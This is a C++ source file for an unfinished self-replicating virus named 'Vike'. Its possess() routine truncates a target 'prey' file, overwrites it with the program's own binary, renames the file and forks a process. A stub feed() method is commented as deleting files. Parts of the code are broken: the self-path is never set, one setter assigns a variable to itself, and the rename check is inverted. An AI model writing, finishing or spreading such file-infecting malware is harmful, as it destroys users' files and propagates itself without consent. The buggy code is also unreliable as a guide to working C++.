#include <iostream>

/* file streams */
#include <fstream>

/* rename() */
#include <cstdio>

/* fork() */
#include <sys/types.h>
#include <unistd.h>

#define BUFFER_SIZE 1024

class Logger : public std::ostream
{
	std::ostream & stream;
	bool enabled;
	bool building_line;

public:
	Logger(std::ostream & stream) : 
		stream(stream), enabled(true), building_line(false) { }

	void set_enabled(bool enable);

	template <typename T>
		Logger & log(T & thing);
};

void Logger::set_enabled(bool enable)
{
	this -> enabled = enabled;
}

template <typename T>
Logger & Logger::log(T & thing)
{
	if (enabled)
	{
		if (!building_line)
			stream << "[LOG]: ";
		//building_line = (thing != std::endl);
		stream << thing;
	}

	return *this;
}

template <typename T> 
Logger & operator <<(Logger & logger, T & thing)
{
	return logger.log(thing);
}

/* declare logger for whole file */
Logger logger(std::cout);

class Vike
{
	std::string self_filename;

public:
	Vike();
	~Vike();

	void live();
	/* deletes file */
	void feed(std::string filename);
	/* clones self into file */
	bool possess(std::string filename);
};

Vike::Vike()
{
}

Vike::~Vike()
{
}

void Vike::live()
{
	logger << "Hello!!! I am vike!!!" << std::endl;
}

void Vike::feed(std::string filename)
{
}

bool Vike::possess(std::string filename)
{
	/* clone self */
	std::ofstream prey;
	std::ifstream self;

	prey.open(filename, std::ios::out | 
	                    std::ios::binary | 
	                    std::ios::trunc);
	if (!prey.is_open()) 
	{
		logger << "Unable to open prey file. ("
		       << filename << ")" << std::endl;
		return false;
	}
	self.open(self_filename, std::ios::in | 
	                         std::ios::binary);
	if (!self.is_open())
	{
		logger << "Unable to open self file. (" 
		       << self_filename << ")" << std::endl;
		return false;
	}

	/* copy data from self to prey */
	char buffer[BUFFER_SIZE];
	do
	{
		self.read(buffer, BUFFER_SIZE);
		prey.write(buffer, self.gcount());
	} while (self.gcount() > 0);

	/* rename preyed file */
	int rename_flag = rename(filename.c_str(), 
			("+" + filename + "+").c_str());
	if (!rename_flag)
	{
		logger << "Unable to rename prey file. (" 
		       << filename << ")" << std::endl;
		return false;
	}

	/* fork our child a new process to live on */
	pid_t pid = fork();

	if (!pid)
	{
		/* this is the child process */

	} else
	{
		/* this is the parent process */

	}

	return true;
}

int main(void)
{
	Vike vike;
	vike.live();
}
